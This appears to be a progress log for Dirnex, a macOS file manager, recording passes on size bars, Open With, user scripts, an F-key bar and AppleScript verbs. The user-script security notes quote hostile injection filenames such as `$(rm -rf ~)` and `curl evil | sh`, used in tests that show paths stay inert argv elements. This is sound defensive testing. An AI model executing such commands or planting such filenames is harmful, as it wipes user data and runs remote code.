- **Continuous width does NOT rescue the dynamic range — pass 9's central claim about pass 10 was
  wrong.** It reasoned that drawing in AppKit is "~8x finer than eighth-blocks, so pass 10 needs only
  a minimum-ink rule". Measured against real directories at an 80 pt bar: in `~`, **86 of 93 rows
  compute to under half a point** (12 of 15 in this repo; `/Applications`, at 6 of 38, is the only
  humane one). The range in `~` is ~10⁶, and 8x is nothing against it. So the floor is not a rounding
  nicety that buys legibility — **it is the difference between "negligible" and "empty"**, and it
  fires constantly. `SizeBar.inkWidth(in:minimum:)` went to the *core* with tests (bytes → width is
  the core's rule), and **zero bytes draws zero ink** deliberately: an empty folder is not
  negligible, it is empty. The tail stays illegible whatever we do — which is *why* pass 9's `share`
  is drawn as a number beside the bar; ncdu keeps the percentage for exactly this reason. A log/sqrt
  scale is **rejected, not deferred**: it would make the tail visible by making bar length mean
  something other than proportion, and a test pins the compression so nobody "fixes" it later.
- **FINDING: pass 9's "serialized" queue buried the one row the chart is about.** Display order is
  alphabetical and uncorrelated with walk cost, so serialized, `Movies` — **79 % of home** — landed at
  **35.7 s of a 35.7 s scan**, dead last, queued behind `Library` (17.0 s) and `Dev` (10.7 s). Movies
  itself walks in 0.03 s: the wait was head-of-line blocking, not work. Widening the queue —
  1→35.7 s/35.7 s, 4→17.9 s/**3.4 s**, 8→16.3 s/**1.8 s**, 16→15.7 s/**0.3 s** (total/t-to-Movies) —
  is not bought for throughput (total plateaus at ~15.7 s, which is `Library` alone and unsplittable)
  but so the chart is *right* within ~2 s instead of re-scaling 8x at the very end. The fear that
  bounded it was measured too, and was mostly unfounded: `DirectorySizer.size` blocks a cooperative-
  pool thread and Swift's pool does not over-commit, yet an interactive listing's **worst case stayed
  at 2.9 ms at width 8** (baseline max 3.5 ms) against M1's 150 ms budget; only width 16 — this
  machine's entire core count — perturbed it at all (12.9 ms). Width is `cores/2`, clamped [2, 8].
- **`DirectorySizeProvider`** — shaped like `GitStatusProvider`/`FinderTagProvider` (off-main, cached,
  published by notification), shared because the unit of caching is one directory's total. Drains
  **newest-request-first** so navigating never waits behind a folder you left; publishes are
  **coalesced to ~10/s**, which is what keeps a 68-directory scan from becoming 68 re-sorts and makes
  the cost independent of row count. Walks use a new `DirectoryLoader.cancellableSize` — a *child*
  task, not detached, so cancellation reaches `DirectorySizer`'s own `isCancelled` mid-walk (the
  existing detached `size` deliberately keeps outliving its caller for Space-on-dir).
- **Two bugs the live run caught that nothing else would have**, both invisible to tests and lint:
  (1) **the first toggle did nothing at all** — installed its column, then no bars and no scan. The
  projection is built inside the render pass, and `updateSizeVisualization` skipped the render when
  the cache came back empty, which is exactly a first toggle; the pending list is read *from* the
  projection that was therefore never built. (2) Fixing that exposed the next: `requestScan` runs on
  every render, and an in-flight child still has no total, so it is still "pending" — the provider
  would have re-queued the whole in-flight batch ten times a second. The provider now tracks
  `inFlight` and de-duplicates.
- Bar column is **contextual like the Git gutter but on a different condition** (the gutter follows
  the *directory*, this follows the *tab*), sits **immediately after Size** — the adjacency that is
  the whole reason the core measures logical bytes — and is **charged to Name**, never added on top.
  That generalized `currentColumnLayout`'s reclaim from one hardcoded ternary to a sum: left alone it
  would have under-reclaimed by 137 pt whenever both columns were up, ratcheting Name narrower on
  every toggle inside a repository. Verified live: pixel-identical headers across repeated toggles.
+14 tests → **678 core tests** (was 669) and **38 app tests** (was 33); `swift test` green, swiftformat
+ swiftlint-strict clean. The type-body gotcha re-fired twice and was paid down rather than
suppressed: `SizeBarTests` is its own file (`SizeVisualizationTests` was at its 250-line limit), and
`PanelViewController` crossed both file *and* type-body limits, so the FSEvents block moved to
`PanelViewController+Watch` along the seam its own `MARK` already drew. **VERIFIED LIVE** against the
real `~`: bars streamed in progressively, and with hidden rows shown the app rendered **Movies 1,08 TB
at 79.2 % filling the bar** and **Library 10.3 %** — matching the independent probe's 79.1802 % and
10.3339 % exactly, with `.lmstudio` observed *settling* 3.2 % → 2.8 % as `Library` landed (the
documented "share of what is known so far"). Toggling hidden rows re-scaled Movies 94.5 % → 79.2 %
(visible-rows-only denominators, live); **Zero KB folders drew no ink while 6 KB ones drew the floor**;
the `..` row drew nothing; the cursor row's bar used the emphasized fill; and the mode stayed in one
pane while the other browsed normally. Switching the mode off **keeps the computed sizes** — they are
Space-on-dir's too, not this mode's to erase. GOTCHA (cost ~20 minutes, and it is a trap for every
future live pass): **`xcodebuild` writes to `~/Library/Developer/Xcode/DerivedData/`, while the repo's
own `build/` directory is a stale copy** — `open build/.../Dirnex.app` silently ran a build from the
previous day, whose View menu was missing the new command *and* pass 8's terminal drawer. Two stale
instances were also already running. Launch from the DerivedData path, and check `ps` first.
**NEXT (M6 pass 11):** Share sheet / "Open With" / Services, then the automation slice (AppleScript/
Shortcuts verbs + user shell scripts on the selection) that M6's exit criteria actually name, then the
iCloud sync-status column. Deferred and still worth doing: extending `DirectoryWatcher` to deliver
event paths, which would keep size invalidation surgical instead of dropping a whole root-to-leaf line
per ping (the conservative rule is correct, just wasteful); and ncdu's `r` — an explicit
refresh/rescan, for which `DirectorySizeCache.removeAll` already exists unused.

Progress (2026-07-16, M6 pass 11 — Share sheet / Open With / Services; **the box closes `[x]`,
VERIFIED LIVE**): the three ways a file leaves this app for another one. Probing ran ahead of the
Swift again (the pass-1 method) and it decided the whole design — three findings, each of which the
obvious implementation would have got wrong:
- **LaunchServices answers per *type*, not per file, and asking is ~25x the cost of reading a type**
  (`urlsForApplications` 6.8 ms/100 vs `contentType` 0.27 ms/100). Two files of one type return
  **byte-identical** app lists, and the `UTType` overloads return exactly what the per-URL ones do
  (checked both). So the core is keyed on **distinct types**: a selection collapses to its types
  first and a thousand marked photos ask **once**. A test with a counting probe pins it, because it
  is the one thing holding a big selection's right-click under the frame budget.
- **The rule for a multi-file selection is intersection, and it bites immediately**: `a.txt` offers
  14 apps, `c.png` offers 8, and together they offer **3** — TextEdit and Preview both drop out.
  Anything less than intersection would list an app that opens half of what you picked.
- **A default is only offered when every type agrees on one** (unanimity), and it must survive the
  intersection. A mixed selection where the types disagree promotes **nothing**: "the app this opens
  in" over a menu that opens the other half in something else is a lie, and Finder doesn't tell it.
  An untypeable item (unknown extension → genuinely 0 apps; or a file deleted between listing and
  right-click → no type at all) **collapses the answer to empty** rather than being skipped — both
  mean "no app opens *every* item", and LaunchServices reaches the same answer on its own, just
  slower. `OpenWithApplications` + `ApplicationRef`/`OpenWithCandidates` are pure, with the probes
  injected exactly like `ExternalDiffTool`.
- **App layer**: `OpenWithLauncher` (the LaunchServices probes + launch; **one** launch for the whole
  selection, so twelve images are one Preview with twelve tabs, not twelve cold starts) and
  `PanelViewController+OpenWith`. Open With and Share are **registry commands that pop a menu, not
  menu-bar submenus** — ⌃T's shape: a File-menu submenu would have to find the focused pane from a
  static builder, while a command rides the responder chain, lands in ⌘K for free, and is rebindable.
  The right-click nests both as real submenus built from the **same items** (`openWithMenuItems`,
  mirroring `tagMenuItems` — an `NSMenuItem` lives in one menu at a time, so items are the shareable
  unit, not menus). All three gate on `handoffTargets` = the marked set, else the cursor, filtered to
  `.local` — the line `tagTargets` already draws, so it works from a results tab (virtual pane, real
  local hits) and greys inside an archive / on SFTP, which have no URL to hand over.
- **Services** is the smallest piece and the one with a real trap: `NSApp.servicesMenu` is
  **single-valued**, so Services lives in the app menu (where macOS puts it) and is *not* duplicated
  into the right-click — a second copy would take the population away from the first rather than
  getting its own. The integration is `registerServicesMenuSendTypes([.fileURL], returnTypes: [])` +
  the pane's `validRequestor`/`writeSelection`; AppKit then **auto-appends Services to the
  right-click menu by itself**, which the live run showed and no code here asked for.
- Two Swift-6 gotchas, both paid down via existing precedent rather than suppressed:
  `NSServicesMenuRequestor` carries no main-actor annotation → `@preconcurrency` conformance (the
  Quick Look panel's fix); and `NSWorkspace.open`'s callback is `@Sendable` and fires off-main, so
  `completion` couldn't reach it → the **`async` overload** inside a `Task` that inherits the main
  actor (`ExternalDiffLauncher`'s shape). GOTCHA (new): the pane is now the delegate of **two**
  submenus, and `menuNeedsUpdate` is handed the menu, not the item — without identifiers on each
  (`.tagsSubmenu` / `.openWithSubmenu`) opening Open With fills it with the **tag list**. Also
  `displayName`/`localizedName` answer **"TextEdit.app"**, extension and all, whenever Finder's
  hide-extensions is off — the name must come from the bundle's own `CFBundleDisplayName`, and an app
  test pins it.
+16 core tests → **694** (was 678) and +5 app tests → **43** (was 38); `swift test` + app
`xcodebuild test` green, swiftformat/swiftlint-strict clean. **VERIFIED LIVE** (launched from
DerivedData, `ps`-checked for stale instances first — last pass's trap): Open With over `notes.txt`
listed **TextEdit (default)** promoted and separated, then Code/Cursor/Chrome/…/Xcode alphabetically
with icons and **no ".app" suffixes**, then Other…; marking `notes.txt` + `photo.png` (marks
outranking a cursor parked on the unopenable file) re-listed exactly **Google Chrome, LibreOfficeDev,
Safari** — the probe's predicted intersection, to the app — with **nothing promoted**, the unanimity
rule on screen; `weird.zzzqqq` showed **"No Applications" + Other…**; the right-click carried Open
With ▸ / Share… / Services ▸; **Services listed real file services** (Show in Finder, Show Info in
Finder, Parallels' Open/Reveal in Windows), proving the requestor is being asked; **TextEdit actually
opened `notes.txt`** showing its real content; the **Share sheet** came up reading "notes · Text
Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **greyed out
inside a zip**. **NEXT (M6 pass 12):** the automation slice M6's exit criteria actually name —
AppleScript/Shortcuts verbs (reveal, copy, run-op) + user shell scripts receiving the selection as
argv/env, surfaced in the palette and F-key bar — then the iCloud sync-status column, which closes
M6. Optional polish now cheap: a **Settings picker for the preferred Open With app** (persist the
`ApplicationRef.bundleIdentifier` the core already carries for exactly this), and Finder's
⌥-toggles-to-"Always Open With".

Progress (2026-07-16, M6 interlude — right-click **Copy Path** everywhere paths live; VERIFIED LIVE):
user asked to copy a location as text from the context menu of a table row (incl. `..`), a path-bar
crumb, and the pane's empty space. A *textual* sibling of ⌘C (which writes file URLs) — new
`PathClipboard` (app) formats `[String]` → newline-joined text and writes it (an injectable
`NSPasteboard` so a test asserts without clobbering the real clipboard); 4 app tests pin the shape.
The three surfaces route to **three different path sources**, which is the whole subtlety: an entry
row copies `selectionTargets()` (so a marked set copies all of them, titled "Copy Paths"); the empty
space copies `panel.path`; and `..` copies **`panel.parentPath`, not the pane dir** — the two share
`backgroundMenu(directory:)` but `contextMenu(forRow:)` hands it the parent for `..`. The item
**captures its paths at build time** into `representedObject`, so a background refresh can't leave it
aimed at a stale row (same reason the crumb menu is built per-crumb, carrying `crumb.target.path`).
One trap avoided: decide entry-vs-`..` from `isParentRow(row)`, **not** the post-retarget
`cursorOnParentRow` — right-clicking a *marked* row leaves that flag untouched and would misread the
row as `..`. **VERIFIED LIVE** in the built app driven end to end: `old-code` row →
`/Users/oleg/jMeter/old-code`; `..` → `/Users/oleg` (parent, not the pane dir); empty space →
`/Users/oleg/jMeter`; the "Users" crumb → `/Users`; and a 2-mark selection → "Copy Paths" copying
`…/old-code\n…/Synergie`. 698 core+app tests green, swiftformat + swiftlint clean.

Progress (2026-07-16, M6 pass 12 — the user-scripts automation core): the pure, tested half of the
automation item's exit-criterion feature ("a user-defined 'convert to webp' script on selection runs
from the palette"). Box stays `[ ]` — no store persistence, no process runner, no palette wiring, no
management UI yet; this is the model + invocation-building half, the same core-first opener every
M4/M5/M6 slice used. **Two new `DirnexCore/Services/` files, purely additive** (no existing-API
changes, so the app is untouched and needs no rebuild). Probing ran ahead of the Swift (the pass-1
method): the `sh -c 'body' name arg1 arg2` argv mapping (`$0`=name, `$1`=arg1, `$#`=count, spaces in
a path preserved as one element) and env/`cwd` passthrough were captured live before the model was
shaped, which fixed the whole security stance in place.
- **`UserScript.swift`** — `UserScript` (name-as-identity `command`+`runMode`+`keywords`, `Codable`,
  secret-free) plus its invocation machinery. `UserScriptRunMode` = `.combined` (one run, whole
  selection as `"$@"`) vs `.perFile` (one run per file, `$1` = that file — the webp case). A
  `UserScriptContext` (selection + both panel dirs) turns into `[UserScriptInvocation]` via
  `invocations(in:shell:)`: **`.combined` yields one invocation even for an empty selection** (a
  directory-scoped script still runs, via env), **`.perFile` yields zero** (nothing to act on).
  **THE SECURITY BOUNDARY, and the reason this is a tested core type, not app glue:** the script text
  is user-authored (trusted), but the *selected paths are attacker-controlled data* — unzip a
  download and you can be browsing a file named ``$(rm -rf ~)`` — so every path is handed to the
  shell as a **separate `argv` element** (`["-c", command, name] + files`) and as environment values,
  **never concatenated into the command text**. A hostile filename therefore arrives as one inert
  `"$1"` and cannot break out and execute — the same "a filename is attacker-controlled data" stance
  `ShellCommandLine` takes for the terminal drawer, pinned by a test that feeds
  ``/tmp/$(rm -rf ~); `curl evil | sh` && echo pwned.txt`` through and asserts it lands verbatim as a
  single argument with the body unchanged. Passing `name` as `$0` also makes the shell's own
  diagnostics read `<name>: …`. The `UserScriptEnvironment` contract (named constants, not magic
  strings) exports `DIRNEX_CURRENT_DIR` (= the process `cwd`), `DIRNEX_OTHER_DIR` (omitted when
  single-pane), `DIRNEX_SELECTION_COUNT`, and `DIRNEX_SELECTED_PATHS` (newline-joined — a documented
  convenience, since `"$@"` is the ambiguity-free authority for a filename that itself holds a
  newline). A palette bridge (`commandID` = `userScript.<name>`, its inverse `name(fromCommandID:)`,
  and `paletteCommand`) lets a script rank/render in ⌘K alongside the built-ins, keyed on the
  `userScript.` prefix so the app can route a pick to the runner instead of an AppKit selector.
- **`UserScripts.swift`** — the ordered, name-de-duplicated collection (a near-twin of
  `ServerConnections`: `save` overwrite-in-place-else-append, `remove`/`rename`/`move`, dedup on
  init *and* on `Codable` decode so a hand-edited store is sanitized), plus `paletteCommands` for the
  app to merge into the catalog.
+22 tests → **724 core tests** (two new suites: invocation shape incl. the empty-selection split, the
two security cases, the env contract, the command-id round-trip, and the collection's save/rename/
move/dedup/JSON rules). `swift test` green, swiftformat + swiftlint-strict clean; app target
untouched. **NEXT (M6 pass 13, the app layer that closes the box):** `UserScriptStore` (UserDefaults
JSON + change-notification, like `ServerConnectionStore`), a `UserScriptRunner` (`Process` per
invocation off-main, sequential, collecting exit codes + stderr, surfacing a failure summary and
leaning on the pane's existing FSEvents watch to show new files — the `ExternalDiffLauncher` shape),
palette dispatch (merge `UserScriptStore.load().paletteCommands` into `reload`, and route a
`userScript.*` pick in `runSelected` to `PanelViewController.runUserScript(_:)` via a
`representedObject`-carrying sender), a `PanelViewController+UserScript.swift` that builds the context
from `handoffTargets`/the two panes' dirs and resolves the shell, a right-click **Scripts ▸** submenu
(dynamic, like the tags/servers submenus), and a management surface to *create* scripts (a Settings
tab or an organizer sheet in the `HotlistOrganizerController` idiom) — then VERIFY LIVE that a
user-defined script on a selection runs from the palette. After that: the **F-key bar** surface (a
TC-style function-key button row, which does not exist in the app yet), and the **AppleScript/
Shortcuts verbs** (reveal, copy, run-op — an AppKit scripting `sdef` / App Intents surface, the
separate automation mechanism the item also names), then the iCloud sync-status column, which closes
M6.

Progress (2026-07-16, M6 pass 13 — the user-scripts app layer; the exit-criterion feature ships,
**VERIFIED LIVE**). The automation box stays `[ ]` because the item also names the **F-key bar** and
the **AppleScript/Shortcuts verbs**, both still to come — but its headline promise, PLAN.md §M6's
exit criterion *"a user-defined 'convert to webp' script on selection runs from the palette"*, is now
real and proven end-to-end. Pass 12's tested `DirnexCore` core (`UserScript`/`UserScripts`) was joined
to AppKit through five new app files plus small wirings, in the same core→app rhythm every milestone
used. No core change (pass 12's 724 tests stand; +1 catalog test for the new command → **725 core**).
- **`UserScriptStore.swift`** — the persistence twin of `ServerConnectionStore`: one shared
  `UserScripts` as JSON in `UserDefaults` (`Dirnex.userScripts`), `load`/`save`, a change
  notification. Secret-free by construction (a script holds only its own shell text + metadata).
- **`UserScriptRunner.swift`** — the non-hermetic half, `ExternalDiffLauncher`'s shape: spawns each
  `UserScriptInvocation` off-main via `Process`, **sequentially** (a `perFile` "convert 400 photos"
  must not fork 400 processes at once), captures exit code + stderr, and reports a `RunOutcome`
  (silent on success — new files arrive via the pane's FSEvents watch, like a Service; a summary alert
  only on a non-zero exit / launch failure). **The one real design call:** a GUI process launched by
  LaunchServices inherits launchd's minimal `PATH`, so `cwebp`/`ffmpeg` wouldn't resolve — the runner
  **unions the standard tool dirs (Homebrew Apple-silicon + Intel, `/usr/bin`, …) onto the inherited
  `PATH`** rather than paying for a login-shell handshake per invocation. It merges the invocation's
  `DIRNEX_*` over the inherited env, sets the cwd, and drains stderr before `waitUntilExit` to dodge a
  full-pipe stall.
- **`PanelViewController+UserScript.swift`** — builds `UserScriptContext` from `handoffTargets`
  (local files only, the Open-With/Share line) + the active pane's dir (cwd/`DIRNEX_CURRENT_DIR`) +
  `host.panelCounterpart`'s dir (`DIRNEX_OTHER_DIR` when local); resolves the shell via
  `TerminalShell.login($SHELL)` (the drawer's resolution); `runUserScript(_:)` reads the script name
  from the sender's `representedObject` (one entry point for both the palette and the submenu),
  runs, and reports. A `perFile` script over an empty selection says "select files first" rather than
  launching zero processes. `manageUserScripts(_:)` opens the organizer; `scriptMenuItems()` builds
  the submenu; a `validateAutomationItem` helper folds into the pane's `validateMenuItem` chain (kept
  under the cyclomatic-complexity limit, like its siblings).
- **Palette dispatch** (`CommandPaletteController`): `reload` joins `CommandCatalog.all` with
  `UserScriptStore.load().paletteCommands` (read fresh each open, so a just-created script is
  searchable immediately); `runSelected` recognises a `userScript.*` id (`UserScript.name(fromCommandID:)`)
  and routes it to `runUserScript(_:)` via a synthetic `representedObject`-carrying `NSMenuItem`,
  everything else keeps the static `CommandBinding.selector` path. A new `file.manageScripts` catalog
  command (+ `CommandBinding` + File menu) makes the organizer reachable from the menu bar and palette.
- **Right-click Scripts ▸ submenu** (`+ContextMenu`): a third lazily-filled submenu (`menuNeedsUpdate`
  switched on the identifier, joining tags + Open With), listing each script then **Manage Scripts…**,
  in both the entry menu and the background menu (a `combined` script runs on the directory).
- **`UserScriptsOrganizerController.swift`** — the *create* surface (the `HotlistOrganizer` idiom,
  grown to a master–detail): a list on the left (+/−), a form on the right (Name, a When-run popup
  `combined`/`perFile`, comma-separated palette Keywords, and a monospaced Command text view with
  quote/dash substitution off so a shell body survives verbatim), each edit written straight to the
  store; name is identity, so a name-field commit is a `rename` that reverts on a clash. GOTCHA
  (recurring): the master–detail tipped the class over SwiftLint `type_body_length` 250 → moved the
  Helpers cluster into a same-file `private extension` (which the rule doesn't count, and same-file
  extensions share the type's `private` scope, so nothing had to widen — unlike the *cross-file* split
  in `SyncDirectoriesController+DiffTable`).
- **App tests** (+5 → **52 app tests**): `UserScriptRunnerTests` spawns real `/bin/sh` to lock the
  runner's contract end-to-end — the cwd + merged `DIRNEX_*` env of a `combined` run, the per-file
  fan-out of `perFile`, empty-selection → zero launches, a non-zero exit surfaced with its stderr,
  and — the load-bearing one — **a file literally named ``$(touch pwned.txt)`` passed through and
  asserted to arrive as one inert `"$1"`, creating no `pwned.txt`** (the security boundary, proven at
  the spawn level, not just at invocation-building).
LIVE VERIFICATION (fixture: two real JPEGs + a text file in a seeded left pane, a second dir in the
right pane): the perFile **"To PNG"** script, run from ⌘K on the two marked photos, produced real
400×400 `photo1.png`/`photo2.png` on disk (one `sips` per file) that appeared via FSEvents; the
right-click **Scripts ▸** submenu listed "To PNG" + "Manage Scripts…"; the organizer **created a new
`combined` "Save List"** entirely through its UI (name, mode, keywords, command), which persisted to
`UserDefaults` and re-loaded on reopen; and running "Save List" from ⌘K wrote `_selection.txt`
containing the two marked paths as `"$@"`, `count=2` (`DIRNEX_SELECTION_COUNT`), and the right pane's
dir (`DIRNEX_OTHER_DIR`) — proving the argv + env contract live. (Aside: a *synthetic* ⌘K keystroke
from the automation harness didn't open the palette — the OS swallows it — but the View-menu item,
which shows ⌘K, opens it fine; that is a harness quirk, not an app defect.) `swift test` (725) + app
`xcodebuild test` (52) green, swiftformat + swiftlint-strict clean. **NEXT (M6):** the **F-key bar**
(a TC-style function-key button row — does not exist in the app yet; a natural home for both built-in
F-key ops and a user script's optional F-key binding), then the **AppleScript/Shortcuts verbs**
(reveal/copy/run-op — an `sdef`/App Intents surface), then the iCloud sync-status column, which closes
M6.

Progress (2026-07-16, M6 pass 14 — the F-key bar; **VERIFIED LIVE**): the Total-Commander function-key
button row along the window bottom. The automation box stays `[ ]` because the item's last piece — the
**AppleScript/Shortcuts verbs** — is still to come, but the F-key bar it also names is now real and
proven end-to-end. Core-first as always; one new core file, five app touch-points.
- **`DirnexCore/Services/FunctionBar.swift`** (pure, tested) — a `FunctionBarSlot` (`functionKey` +
  short `label` + `commandID`, `Codable`) and `FunctionBar.defaultSlots`: **F2 Rename · F3 View · F5
  Copy · F6 Move · F7 NewFolder · F8 Delete**. Data, not AppKit, so the layout is unit-tested and a
  later user-configurable bar (and a user script's F-key binding) is a change to *data*. Every slot
  names a real `CommandCatalog` command (a test pins it); `slot(forFunctionKey:)` is the pane key
  handler's lookup. +7 core tests → **740**.
- **THE key-dispatch insight (why the bar can own F3 with zero double-fire):** F2/F5–F8 already carry a
  bare-function-key **menu key-equivalent**, and AppKit fires a menu equivalent *before* the event ever
  reaches `keyDown`. So a `keyDown` F-key handler only ever *receives* the F-keys with **no** menu
  equivalent — F3 (Quick Look, whose own shortcut is ⌘Y) and, later, a user script's F9–F12 — and can
  dispatch them unconditionally without ever colliding with the menu. `FileTableView.keyDown` grew a
  `functionKeyNumber(for:)` decode (scalars in `NSF1FunctionKey…NSF35FunctionKey`) → a new
  `fileTable(_:functionKey:)` delegate call → `PanelViewController` looks up the slot and dispatches.
  **Live-proven:** pressing the physical **F3** opened Quick Look on `alpha.txt`, exactly the
  no-menu-equivalent path.
- **THE app-layer bug the live run caught, and the real design correction:** the first cut gave each
  button `target = nil` + `action = <selector>`, betting a nil-target dispatch would walk the responder
  chain to the active pane like a menu item does. **It silently no-op'd** — clicking a bottom-bar button
  (outside both panes) drops the pane's first-responder status *first*, so by the time the action
  dispatches, no responder in the key window implements `copyToOtherPane:`. A temporary `NSLog` at the
  dispatch site (app launched from Terminal to capture stderr — `open`-launched apps hide it) made it
  unambiguous: with the fix, `handled=true fr=FileTableView`; the menu path had always worked, isolating
  it to button dispatch. The fix: the button reports its slot to the bar's `onRun` callback; the window
  controller **re-focuses the active pane** (`focusedPanel.focusTable()`) **then** dispatches to nil —
  which both puts the pane back in the responder chain *and* matches TC, where a function-button click
  acts on the active pane and leaves focus there. GOTCHA for the live tester: a click that has to pass
  *through* a modal (cancelling a conflict sheet in the same batch) gets swallowed mid-animation — it
  reads as an intermittent button, but a deliberate single click is 100% reliable (proven by the log).
- **`FunctionBarView.swift`** — a `FunctionBarButton` (borderless, self-drawn: dim monospaced key token
  + primary caption, hover/press fills, a leading hairline on all but the first, `refusesFirstResponder`
  so a click never steals pane focus) in a `fillEqually` `NSStackView`, with a top hairline matching the
  column-header/queue-bar borders. Fixed 28 pt; the window controller owns the height constraint.
- **`BrowserWindowController+FunctionBar.swift`** + main-file layout — the bar is pinned at the **very
  bottom, below the queue bar** (so a running op surfaces its progress just above the buttons that
  started it), collapsed to zero height when off (the queue-bar collapse mechanism). App-wide visibility
  via `AppPreferences.showFunctionBar` (**default on** — a signature discoverability win, the "fix TC's
  adoption problem" goal) + `showFunctionBarDidChange`, so every window toggles together; a
  `view.functionBar` catalog command ("Show Function Key Bar", no shortcut) drives it from the View menu
  (checkmark via `validateToggleItem`), the ⌘K palette, and a Settings ▸ Panels toggle.
- +4 app tests (`FunctionBarViewTests`: every slot resolves to a wired selector; one button per slot
  carrying its slot + refusing focus; a click reports its slot to `onRun`) → **56 app**. `swift test`
  (740) + app `xcodebuild test` (56) green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE**
  (fresh DerivedData build, `ps`-checked): the bar rendered the six buttons; the **F5 Copy** button
  copied the active pane's cursor/marked file to the other pane (raised the real per-file conflict sheet
  on a name clash, and cleanly landed `beta.txt` with no clash); the **F7 NewFolder** button opened the
  create sheet and made `made-by-f7`; **View ▸ Show Function Key Bar** toggled the bar away (panes
  reclaimed the strip) and back, its checkmark tracking; and the physical **F3** key opened Quick Look.
  KNOWN macOS caveat (not a bug): on a Mac keyboard F3/F5/… may be media keys unless "Use F1, F2 etc.
  as standard function keys" is set — the *buttons* always work regardless; the same caveat already
  applied to F5–F8. **NEXT (M6, closes the automation box):** the **AppleScript/Shortcuts verbs**
  (reveal/copy/run-op — an `sdef`/App Intents surface), plus optionally a user script's F-key binding
  (a slot pointing at a `userScript.<name>` command id — the bar and key handler already accept any
  command id, so it's a UI field on the organizer + one core field on `UserScript`). Then the iCloud
  sync-status column, which closes M6.

Refinement (2026-07-16, VERIFIED LIVE — three visual asks from the user): (1) **the bar no longer spans
under the sidebar** — it moved out of the window-wide container and into the *panes column*, a new
`makePaneColumnController` that wraps `[paneStackSplitViewController, functionBar]` as the outer split's
**second** item (the sidebar is the first and now stays full height beside it, exactly as the terminal
drawer already did). The queue bar stays full-width in the container below. (2) **Background is the
sidebar's vibrant material, not a flat fill** — the earlier `windowBackgroundColor` came out RGB(30,30,30),
a near-black neutral grey that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
the bar now hosts an `NSVisualEffectView` with material **`.sidebar`** (probed live: `.windowBackground`
renders a flat grey, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
(3) **Buttons are rounded chips filling the height** — self-drawn `NSBezierPath(roundedRect:)` per state
(rest 0.07 / hover 0.14 / press 0.22 `labelColor` alpha, radius 6), the hairline separators dropped, a
`fillEqually` stack with 5 pt gaps and a 3 pt vertical inset, bar height 28→**32**. GOTCHA (recurring):
`makePaneColumnController` tipped `BrowserWindowController` over `type_body_length` 250 → moved both
view-builders into a same-file `private extension` (shares the type's `private` scope, doesn't count toward
the limit). Verified live: the bar sits flush right of the full-height sidebar, its blue matches the
sidebar, the F3 button still opened Quick Look (dispatch survives the reparent — `focusedPanel.focusTable()`
+ nil-target dispatch is independent of where the bar lives). One app test dropped (the leading-separator
invariant) → **55 app**; 740 core green, lint + format clean.

Progress (2026-07-17, M6 pass 15 — the AppleScript verbs; **the automation box closes `[x]`, VERIFIED
LIVE**): the last piece the automation item named — an AppleScript scripting surface — landed, so the
whole item (user scripts + palette + F-key bar from passes 12–14, now the verbs) is `[x]`. I chose
**AppleScript/`sdef`** over the App Intents/Shortcuts alternative the item also offers, for one decisive
reason: it is driveable and observable straight from `osascript`, so every verb was verified end-to-end
from the shell (App Intents would need a Shortcut authored in the Shortcuts app first). Core-first as
always: one new tested core file, then the `sdef` + Info.plist + handlers.
- **`DirnexCore/Services/Automation.swift`** (pure, tested) — three pieces the handlers lean on, so the
  Apple-event glue stays dumb. **`AutomationVerb`** (`.reveal`/`.copySelection`/`.runOperation`, each
  with its AppleScript `commandName`) is the one place the verb names live, referenced by the `sdef`,
  the tests, and error strings. **`AutomationReveal.target(forPOSIXPath:)`** turns a script's POSIX path
  into the `(container, item)` a panel navigates to — Finder semantics (a folder is selected *in its
  parent*, not entered), root has no item, a relative/empty path yields `nil`; `VFSPath` normalizes the
  slashes. **`AutomationOperation.resolve`** maps a free-text operation onto the flat command-id space:
  exact id, then menu title (case- and trailing-`…`-insensitive, so `rename` hits `file.rename`), then a
  user script by name or `userScript.<name>` id — **built-ins win over a like-named user script** (a
  test pins it). +13 core → **753**.
- **`Dirnex/Dirnex.sdef`** — a "Dirnex Suite" with `reveal` (text direct-param), `copy selection`, and
  `run operation` (text direct-param), each mapped to an `NSScriptCommand` subclass via `<cocoa class>`.
  Command names avoid AppleScript's `copy` language keyword (hence `copy selection`, not `copy`).
- **Info.plist via a merge, not a rewrite** — the project is `GENERATE_INFOPLIST_FILE = YES`, which has
  no `INFOPLIST_KEY_*` for the two keys AppleScript needs (`NSAppleScriptEnabled`,
  `OSAScriptingDefinition`). THE build call: add a **partial** `Dirnex/Info.plist` holding only those two
  keys and point `INFOPLIST_FILE` at it — modern Xcode **merges** it over the generated plist rather than
  replacing it (verified in the built bundle: both keys present *and* `CFBundleName` etc. still
  generated). The `.sdef` rides into `Contents/Resources/` automatically because `Dirnex/` is a
  file-system-synchronized group — no explicit resource reference needed.
- **`Dirnex/Scripting/ScriptingCommands.swift`** — the three `@objc(Dirnex…ScriptCommand)` subclasses
  (the `@objc` names are exactly the `sdef`'s `<cocoa class>` strings). Each decodes its direct
  parameter, then — since Apple events arrive on the main thread but `performDefaultImplementation` is
  nonisolated — does the UI work inside `MainActor.assumeIsolated`. **GOTCHA: `assumeIsolated`'s result
  must be `Sendable`, and `Any?` is not** — so the isolated closure returns a `Bool`/`Bool?` and the
  `Any?`/scriptError is built outside it. Failures set `scriptErrorNumber`/`scriptErrorString` so a
  script sees a real AppleScript `error` (proven live: an unknown op raised
  `"…" is not a known Dirnex operation. (-1728)`).
- **`Dirnex/Browser/BrowserWindowController+Scripting.swift`** — where a decoded verb meets the active
  pane. `runCommand(id:)` is now the **single dispatch path** shared by `run operation`/`copy selection`
  *and* the F-key bar (`runFunctionBarSlot` delegates to it), and it routes a `userScript.*` id to the
  script runner exactly as the ⌘K palette does — so bar, palette, and AppleScript can't drift.
- **THE two live-caught dispatch bugs (and the real fix):** first cut used `NSApp.sendAction(to: nil)`
  like the F-key bar. From a script it returned `false` and did nothing, because **an Apple event
  arrives while Dirnex is a *background* app — there is no key window, and `sendAction(to: nil)` starts
  at the key window's first responder.** Adding `NSApp.activate` + `makeKeyAndOrderFront` did **not**
  fix it: key-window status is granted **asynchronously**, so within the same synchronous handler there
  is *still* no key window. The fix: dispatch with **`window.firstResponder.tryToPerform(_:with:)`**,
  walking the active pane's *own* responder chain (table → pane → window → window controller), which
  doesn't depend on key status; `NSApp.sendAction` stays only as a fallback for the app-level commands
